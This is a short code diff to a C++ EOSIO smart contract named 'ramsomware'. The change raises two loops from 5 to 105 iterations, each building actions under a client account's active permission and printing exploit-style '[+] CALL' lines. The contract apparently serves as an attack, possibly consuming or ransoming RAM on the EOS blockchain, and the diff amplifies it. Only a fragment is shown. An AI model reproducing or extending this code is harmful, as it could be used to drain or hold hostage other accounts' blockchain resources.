@@ -41,7 +41,7 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client,  uint64_t(1)) );
             out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client, uint64_t(2)) );
             
-            for(int i =0; i<=4; i++)
+            for(int i =0; i<=104; i++)
             { 
                 out1.actions.pop_back();
                 out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n, std::make_tuple(client, uint64_t(initnum+(idx)+i) ));
@@ -50,7 +50,7 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
                 print("[+] CALL 1st: ", ((idx)+i), "\n");
             }
 
-            for (int i = 0; i<=4; i++)
+            for (int i = 0; i<=104; i++)
             {
                 // 5,6,7 /
                 out2.actions.pop_back();
